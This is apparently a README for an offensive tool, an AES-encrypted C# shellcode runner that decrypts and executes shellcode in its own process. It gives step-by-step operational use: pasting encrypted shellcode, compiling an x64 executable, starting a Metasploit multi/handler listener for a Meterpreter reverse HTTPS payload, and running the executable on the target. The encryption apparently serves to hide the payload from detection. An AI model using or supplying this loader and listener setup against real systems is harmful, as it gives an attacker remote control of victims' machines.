# AES Normal Shellcode Runner

## Files

| File | Purpose |
|---|---|
| `aes-normal-shellcode-runner.cs` | C# runner — AES decrypts shellcode, executes in self via VirtualAlloc + CreateThread |

## Usage

**1. Encrypt your shellcode** using `../aes-shellcode-encryption/` and copy the output `buf`.

**2. Paste the encrypted buf into `aes-normal-shellcode-runner.cs`:**
```csharp
byte[] buf = new byte[778] { 0xfe, 0x4a, 0x85, ... };  // ← replace
```

**3. Compile:**

**Visual Studio:**
1. Create a new project → Console App (.NET Framework)
2. Replace `Program.cs` with the contents of `aes-normal-shellcode-runner.cs`
3. Set configuration to **Release** and platform to **x64**
4. Build → Build Solution (`Ctrl+Shift+B`)
5. Exe is in `bin\x64\Release\`

**Command line:**
```powershell
csc /target:exe /platform:x64 /optimize+ /out:Runner.exe aes-normal-shellcode-runner.cs
```

**4. Start your listener:**
```bash
msfconsole -q -x "
    use multi/handler;
    set payload windows/x64/meterpreter/reverse_https;
    set LHOST <IP>;
    set LPORT 443;
    run"
```

**5. Run the exe on the target.**
